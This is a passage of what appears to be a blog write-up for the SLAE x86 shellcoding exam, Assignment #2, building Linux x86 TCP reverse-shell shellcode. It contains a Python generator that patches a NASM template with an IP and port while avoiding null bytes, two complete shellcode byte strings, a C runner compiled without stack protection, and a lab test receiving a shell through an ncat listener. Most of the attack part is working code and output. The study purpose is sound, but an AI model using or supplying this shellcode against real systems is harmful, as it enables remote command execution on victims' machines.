<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">replace_template_values</span><span class="p">(</span><span class="n">template_name</span><span class="p">,</span> <span class="n">tcp_port</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">,</span> <span class="n">output_file_path</span><span class="p">):</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">template_name</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">template_code</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">tcp_port_hex</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcp_port</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"little"</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>

    <span class="k">if</span> <span class="s">'00'</span> <span class="ow">in</span> <span class="n">tcp_port_hex</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">'00'</span> <span class="ow">in</span> <span class="n">tcp_port_hex</span><span class="p">[:</span><span class="mi">2</span><span class="p">]:</span>
            <span class="n">non_null_byte</span> <span class="o">=</span> <span class="n">tcp_port_hex</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
            <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"mov bl, 0x</span><span class="si">{</span><span class="n">non_null_byte</span><span class="si">}</span><span class="se">\n</span><span class="s">    push bx</span><span class="se">\n</span><span class="s">    xor ebx, ebx"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">non_null_byte</span> <span class="o">=</span> <span class="n">tcp_port_hex</span><span class="p">[:</span><span class="mi">2</span><span class="p">]</span>
            <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"mov bh, 0x</span><span class="si">{</span><span class="n">non_null_byte</span><span class="si">}</span><span class="se">\n</span><span class="s">    push bx</span><span class="se">\n</span><span class="s">    xor ebx, ebx"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"push WORD 0x</span><span class="si">{</span><span class="n">tcp_port_hex</span><span class="si">}</span><span class="s">"</span>
    
    <span class="n">template_code</span> <span class="o">=</span> <span class="n">template_code</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="n">replace_code</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

    <span class="n">ip_address_bytes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ip_address</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"."</span><span class="p">)][::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    
    <span class="k">if</span> <span class="mi">0</span> <span class="ow">in</span> <span class="n">ip_address_bytes</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[!] Found NULL byte in IP address"</span><span class="p">)</span>

        <span class="c1"># choose a random byte from the range(1,256), excluding the bytes that make up the IP address
</span>        <span class="n">random_xor_byte</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">))</span> <span class="o">-</span> <span class="nb">set</span><span class="p">(</span><span class="n">ip_address_bytes</span><span class="p">)))</span>

        <span class="c1"># encode XORing DWORD and XORed DWORD to hexadecimal
</span>        <span class="n">xor_dword</span> <span class="o">=</span> <span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">random_xor_byte</span><span class="p">])</span> <span class="o">*</span> <span class="mi">4</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
        <span class="n">ip_address_xored_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">random_xor_byte</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ip_address_bytes</span><span class="p">]).</span><span class="nb">hex</span><span class="p">()</span>
        
        <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"mov ebx, 0x</span><span class="si">{</span><span class="n">ip_address_xored_bytes</span><span class="si">}</span><span class="se">\n</span><span class="s">    xor ebx, 0x</span><span class="si">{</span><span class="n">xor_dword</span><span class="si">}</span><span class="se">\n</span><span class="s">    push ebx</span><span class="se">\n</span><span class="s">    xor ebx, ebx"</span>
</code></pre></div></div>
<p><sub class='aside'>The function also checks for <code>NULL</code> bytes inside the IP address, <code>XOR</code>-ing the values with a random byte in case there are
</sub></p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">else</span><span class="p">:</span>
        <span class="n">ip_address_hex</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([(</span><span class="n">x</span><span class="p">).</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"little"</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">ip_address_bytes</span><span class="p">])</span>
        <span class="n">replace_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"push 0x</span><span class="si">{</span><span class="n">ip_address_hex</span><span class="si">}</span><span class="s">"</span>
    
    <span class="n">template_code</span> <span class="o">=</span> <span class="n">template_code</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="n">replace_code</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>
</code></pre></div></div>
<p>When you run the script it shows you the required arguments:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 script.py <span class="nt">-h</span>

<span class="c"># usage: wrapper.py [-h] -p [1-65535] -ip IP -t TEMPLATE -o OUTPUT</span>

<span class="c"># optional arguments:</span>
<span class="c">#   -h, --help            show this help message and exit</span>
<span class="c">#   -p [1-65535], --port [1-65535]</span>
<span class="c">#                         TCP Port of the Bind Shell</span>
<span class="c">#   -ip IP, --ip IP       IP address of the Bind Shell</span>
<span class="c">#   -t TEMPLATE, --template TEMPLATE</span>
<span class="c">#                         Path of the NASM template file. Example: -t /tmp/template.nasm</span>
<span class="c">#   -o OUTPUT, --output OUTPUT</span>
<span class="c">#                         Path of the output file. Example: -o /tmp/output.nasm</span>
</code></pre></div></div>
<p>If you pass the required arguments, it finally prints the shellcode which you can copy into a shellcode runner. Follows an example:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 wrapper.py <span class="nt">-p</span> 1234 <span class="nt">-ip</span> <span class="s2">"127.0.0.1"</span> <span class="nt">-t</span> ./template.nasm <span class="nt">-o</span> /tmp/output.nasm

<span class="c"># [!] Found NULL byte in IP address</span>
<span class="c"># [+] Object file generated at /tmp/output.nasm</span>
<span class="c"># [+] Executable binary generated at /tmp/output</span>
<span class="c"># [+] Shellcode length: 99 bytes</span>
<span class="c"># [+] Shellcode:</span>
<span class="c"># "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\xbb\xa0\xdf\xdf\xde\x81\xf3\xdf\xdf\xdf\xdf\x53\x31\xdb\x66\x68\x04\xd2\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";</span>
</code></pre></div></div>
<p>The python script and the <code>NASM</code> template are stored inside the aforementioned Git repository, to be more specific they can be found in the folder <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/2/automation">assignment/2/automation</a>.</p>
<h2 id="testing">Testing</h2>
<p>To test that everything works correctly, I used the python script to generate the shellcode for a TCP Reverse Shell listening on <code>192.168.1.107:256</code>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 wrapper.py <span class="nt">-p</span> 256 <span class="nt">-ip</span> <span class="s2">"192.168.1.107"</span> <span class="nt">-t</span> ./template.nasm <span class="nt">-o</span> /tmp/output.nasm

<span class="c"># [+] Object file generated at /tmp/output.nasm</span>
<span class="c"># [+] Executable binary generated at /tmp/output</span>
<span class="c"># [+] Shellcode length: 92 bytes</span>
<span class="c"># [+] Shellcode:</span>
<span class="c"># "\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80";</span>
</code></pre></div></div>
<p>To test the shellcode generated by the python script, I used the following C <code>shellcode runner</code>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x31\xc0\x89\xc3\x89\xc1\xb0\x66\xb1\x06\x51\xfe\xc3\x53\xb1\x02\x51\x89\xe1\xcd\x80\x89\xc6\x68\xc0\xa8\x01\x6b\xb3\x01\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x56\x31\xc0\xb0\x66\xb3\x03\x89\xe1\xcd\x80\x89\xd9\x51\xb0\x3f\x89\xf3\x8b\x0c\x24\x49\xcd\x80\x59\xe2\xf2\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>

<span class="n">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>

    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span>
    <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Compile and run it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack shellcode_runner.c <span class="nt">-o</span> /tmp/tcp_rev_shell
/tmp/tcp_rev_shell
</code></pre></div></div>
<p>On my Kali machine, on which I previously set up a ncat listener (<code>sudo ncat -nvlp 256</code>), I received a reverse shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 256

<span class="c"># Ncat: Listening on :::256</span>
<span class="c"># Ncat: Listening on 0.0.0.0:256</span>
<span class="c"># Ncat: Connection from 192.168.1.105.</span>
<span class="c"># Ncat: Connection from 192.168.1.105:60058.</span>
<span class="c"># id</span>
<span class="c"># uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)</span>
<span class="c"># whoami</span>
<span class="c"># rbct</span>
</code></pre></div></div>


            <footer class="tags">
                <section class="mono tags">
                    Tagged

                    
                    <a href="/tags#/tags/slae/">slae</a>, <a href="/tags#/tags/x86/">x86</a>, <a href="/tags#/tags/shellcode/">shellcode</a>, <a href="/tags#/tags/assembly/">assembly</a>, <a href="/tags#/tags/nasm/">nasm</a>, <a href="/tags#/tags/c/">c</a>, <a href="/tags#/tags/exam/">exam</a>, <a href="/tags#/tags/python/">python</a>
                </section><section class="pagination">
                        <a href="/21/12/21/slae32-assignment-3">
                            <div class="mono">NEXT</div>
                            SLAE x86 Exam - Assignment #3
                        </a>
                    </section><section class="pagination">
                        <a href="/21/11/28/slae32-assignment-1">
                            <div class="mono">PREVIOUS</div>
                            SLAE x86 Exam - Assignment #1
                        </a>
                    </section></footer>
        </main>
    </article>
  </body>
</html>
